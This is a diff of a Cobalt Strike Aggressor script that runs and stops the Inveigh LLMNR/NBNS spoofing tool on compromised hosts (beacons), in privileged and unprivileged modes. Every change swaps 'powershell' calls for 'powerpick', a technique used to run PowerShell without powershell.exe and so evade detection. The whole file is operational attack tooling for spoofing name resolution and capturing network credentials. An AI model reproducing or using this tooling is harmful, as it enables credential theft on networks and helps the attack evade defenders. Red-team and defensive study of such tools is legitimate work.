@@ -10,8 +10,8 @@ sub runPrivilegedInveigh {
 	binput($1, "powershell-import " . script_resource("inveigh/Scripts/Inveigh.ps1"));
 	bpowershell_import($1, script_resource("inveigh/Scripts/Inveigh.ps1"));
 	prompt_text("How long would you like to run Inveigh (in minutes)?", "15", {
-		binput($bid, "powershell Invoke-Inveigh -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
-		bpowershell($bid, "Invoke-Inveigh -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
+		binput($bid, "powerpick Invoke-Inveigh -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
+		bpowerpick($bid, "Invoke-Inveigh -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
 	});
 }
 
@@ -20,8 +20,8 @@ sub runUnPrivilegedInveigh {
 	binput($1, "powershell-import " . script_resource("inveigh/Scripts/Inveigh-Unprivileged.ps1"));
 	bpowershell_import($1, script_resource("inveigh/Scripts/Inveigh-Unprivileged.ps1"));
 	prompt_text("How long would you like to run Inveigh (in minutes)?", "15", {
-		binput($bid, "powershell Invoke-InveighUnprivileged -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
-		bpowershell($bid, "Invoke-InveighUnprivileged -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
+		binput($bid, "powerpick Invoke-InveighUnprivileged -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
+		bpowerpick($bid, "Invoke-InveighUnprivileged -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
 	});
 }
 
@@ -29,14 +29,14 @@ sub stopInveigh{
 	$bid = $1;
 	binput($1, "powershell-import " . script_resource("inveigh/Scripts/Inveigh.ps1"));
 	bpowershell_import($1, script_resource("inveigh/Scripts/Inveigh.ps1"));
-	bpowershell($bid, "Stop-Inveigh");
+	bpowerpick($bid, "Stop-Inveigh");
 }
 
 sub stopInveigh-Unprivileged{
 	$bid = $1;
 	binput($1, "powershell-import " . script_resource("inveigh/Scripts/Inveigh-Unprivileged.ps1"));
 	bpowershell_import($1, script_resource("inveigh/Scripts/Inveigh-Unprivileged.ps1"));
-	bpowershell($bid, "Stop-Inveigh");
+	bpowerpick($bid, "Stop-Inveigh");
 }
 
 popup beacon_bottom {
